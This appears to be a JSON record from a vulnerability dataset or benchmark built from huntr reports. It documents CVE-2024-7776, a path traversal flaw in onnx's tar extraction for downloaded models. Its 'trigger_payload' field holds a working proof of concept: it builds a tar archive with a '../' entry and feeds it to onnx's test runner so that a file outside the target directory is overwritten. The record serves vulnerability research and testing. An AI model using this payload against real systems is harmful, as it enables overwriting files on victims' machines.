@@ -1,0 +1,15 @@
+{
+  "file_id": "401_onnx_huntr_a7a46cf6-1fa0-454b-988c-62d222e83f63",
+  "numeric_id": "401",
+  "library_hint": "onnx",
+  "source": "huntr",
+  "title": "Arbitrary file overwrite in onnx/backend/test/runner/download_model due to lack of path traversal protection in tarfile extraction",
+  "cve": "CVE-2024-7776",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "onnx",
+  "affected_version": "<= 1.16.1",
+  "vulnerable_function": "tarfile.open",
+  "triggerability": "indirect",
+  "trigger_payload": "import tarfile\nimport os\ntar = tarfile.open(\"poc.tar\",\"w\")\ntar.add('../poc.txt')\ntar.close()\n\nimport onnx.backend.test as obt\nimport onnx.backend as ob\ntestcast = obt.runner.TestCase(name=\"evil\", model_name=\"onnx\", url=\"http://127.0.0.1:8000/poc.tar\", model_dir=None, model=None, data_sets=None, kind=\"tar\", rtol=0.0, atol=0.0)\nrunner = obt.runner.Runner.download_model(testcast, \"\", \"./\")",
+  "oracle": "arbitrary file overwrite occurs, such as creating or overwriting files in the parent directory of the target path"
+}
